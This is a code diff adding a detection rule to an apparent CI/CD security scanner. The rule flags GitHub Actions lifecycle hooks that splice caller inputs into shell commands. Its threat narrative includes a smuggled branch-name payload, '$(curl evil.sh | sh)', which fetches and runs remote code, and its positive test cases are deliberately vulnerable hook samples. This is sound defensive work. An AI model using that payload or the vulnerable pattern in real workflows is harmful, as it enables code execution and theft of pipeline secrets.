+    Rule(
+        id="TAINT-GH-019",
+        title="Action lifecycle hook (runs.pre / runs.post) interpolates an input into its command",
+        severity=Severity.HIGH,
+        platform=Platform.GITHUB,
+        owasp_cicd="CICD-SEC-4",
+        description=(
+            "An ``action.yml`` lifecycle hook â€” ``runs.pre``, "
+            "``runs.post``, ``runs.pre-entrypoint`` or "
+            "``runs.post-entrypoint`` â€” builds its command line from "
+            "``${{ inputs.X }}``.  These hooks run a script before/after "
+            "the action's main step with the same job permissions, and "
+            "the input value is whatever the caller passed â€” which may be "
+            "attacker-controlled (``${{ github.event.* }}`` forwarded by "
+            "the caller).  Interpolating it directly into the hook "
+            "command is shell injection in a privileged lifecycle stage; "
+            "``pre-if`` / ``post-if`` gate *whether* the hook runs, not "
+            "*what* it runs.\n"
+            "\n"
+            "Cross-artifact taint (XF-GH-006) covers ``${{ inputs.X }}`` "
+            "reaching a composite ``run:`` step; this rule covers the "
+            "``runs.pre`` / ``runs.post`` scalar sinks, which are not "
+            "``run:`` steps and so fall outside that analysis."
+        ),
+        pattern=RegexPattern(
+            match=(
+                r"^\s*(?:pre|post)(?:-entrypoint)?:\s+\S.*"
+                r"\$\{\{\s*inputs\.[A-Za-z0-9_-]+\s*\}\}"
+            ),
+            exclude=[r"^\s*#"],
+        ),
+        remediation=(
+            "Do not build the hook command from an input.  Pass the "
+            "value through the environment and reference it as a shell "
+            "variable inside the hook script, where it is data, not "
+            "code:\n"
+            "\n"
+            "    runs:\n"
+            "      using: docker\n"
+            "      image: Dockerfile\n"
+            "      pre-entrypoint: /init.sh\n"
+            "      env:\n"
+            "        BRANCH: ${{ inputs.branch }}\n"
+            "\n"
+            "and have ``/init.sh`` quote ``\"$BRANCH\"``."
+        ),
+        reference=(
+            "https://docs.github.com/en/actions/creating-actions/"
+            "metadata-syntax-for-github-actions#runspre"
+        ),
+        test_positive=[
+            "runs:\n  using: docker\n  image: Dockerfile\n"
+            "  pre: setup.sh ${{ inputs.branch }}\n",
+            "  post-entrypoint: /cleanup.sh ${{ inputs.artifact_path }}\n",
+            "  post: /tmp/teardown ${{ inputs.target }}\n",
+        ],
+        test_negative=[
+            # Hook with no input interpolation â€” safe.
+            "runs:\n  using: docker\n  image: Dockerfile\n  pre: /init.sh\n",
+            # pre-if gates execution, not command content.
+            "  pre-if: success()\n",
+            # inputs reach a run: step, not a pre/post hook â€” owned by
+            # XF-GH-006 / composite taint, not this rule.
+            "  steps:\n    - run: echo ${{ inputs.x }}\n      shell: bash\n",
+            "  # pre: setup.sh ${{ inputs.branch }}",
+        ],
+        stride=["E", "T"],
+        threat_narrative=(
+            "A composite or docker action takes a ``branch`` input and "
+            "splices it into its pre-entrypoint command.  A caller wires "
+            "that input to ``${{ github.event.pull_request.head.ref }}``; "
+            "an attacker names their fork branch "
+            "``$(curl evil.sh | sh)`` and the action's lifecycle hook "
+            "executes it before the main step even begins, with the "
+            "caller workflow's full token and secrets."
+        ),
     ),
 ]
